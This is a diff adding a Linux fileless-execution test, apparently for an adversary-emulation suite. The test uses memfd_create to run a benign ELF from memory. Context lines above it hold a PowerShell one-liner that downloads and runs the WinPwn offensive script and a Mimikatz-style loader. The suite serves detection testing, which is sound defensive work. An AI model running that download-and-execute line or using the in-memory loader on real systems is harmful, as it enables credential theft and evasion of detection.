@@ -11,3 +11,63 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       mimiload -consoleoutput -noninteractive
     name: powershell
+- name: Linux fileless ELF execution via memfd_create
+  auto_generated_guid: cc205fe3-932a-460e-a42e-79ebda89d220
+  description: |
+    Loads a benign ELF (`/bin/uname` by default) into an anonymous in-memory file created with
+    `memfd_create(2)` and executes it directly from `/proc/self/fd/<n>`, so the payload runs entirely
+    from RAM with no corresponding file on disk. This mirrors Linux fileless-malware and
+    post-exploitation tooling that stage ELF payloads in anonymous memory to evade on-disk detection.
+    While the loaded program runs, the process exposes an anonymous `memfd:` mapping and a
+    `/proc/<pid>/exe` target of `/memfd:<name> (deleted)`.
+    See https://man7.org/linux/man-pages/man2/memfd_create.2.html
+  supported_platforms:
+  - linux
+  input_arguments:
+    elf_binary:
+      description: Path to the benign ELF executed from anonymous memory
+      type: path
+      default: /bin/uname
+    memfd_name:
+      description: Name assigned to the anonymous in-memory file, visible in /proc/<pid>/maps and as the /proc/<pid>/exe target
+      type: string
+      default: atomic_memfd
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      python3 is required to invoke the memfd_create syscall and execute from /proc/self/fd.
+    prereq_command: |
+      if command -v python3 >/dev/null 2>&1; then exit 0; else exit 1; fi
+    get_prereq_command: |
+      echo "Install python3 with your package manager, e.g. 'sudo apt-get install -y python3' or 'sudo yum install -y python3'"; exit 1
+  executor:
+    command: |
+      python3 - "#{elf_binary}" "#{memfd_name}" <<'PYEOF'
+      import ctypes, os, platform, sys
+      path = sys.argv[1]
+      name = sys.argv[2].encode()
+      libc = ctypes.CDLL(None, use_errno=True)
+      flags = 0
+      fd = -1
+      if hasattr(libc, "memfd_create"):
+          libc.memfd_create.restype = ctypes.c_int
+          libc.memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
+          fd = libc.memfd_create(name, flags)
+      if fd < 0:
+          nr = {"x86_64": 319, "aarch64": 279}.get(platform.machine(), 319)
+          libc.syscall.restype = ctypes.c_int
+          fd = libc.syscall(ctypes.c_long(nr), ctypes.c_char_p(name), ctypes.c_uint(flags))
+      if fd < 0:
+          sys.exit("memfd_create failed: " + os.strerror(ctypes.get_errno()))
+      data = open(path, "rb").read()
+      off = 0
+      while off < len(data):
+          off += os.write(fd, data[off:])
+      pid = os.fork()
+      if pid == 0:
+          os.execv("/proc/self/fd/%d" % fd, [name.decode()])
+      os.waitpid(pid, 0)
+      print("[+] Executed '%s' from an anonymous in-memory file (memfd:%s) via /proc/self/fd/%d with no on-disk payload" % (path, name.decode(), fd))
+      PYEOF
+    name: bash
+    elevation_required: false
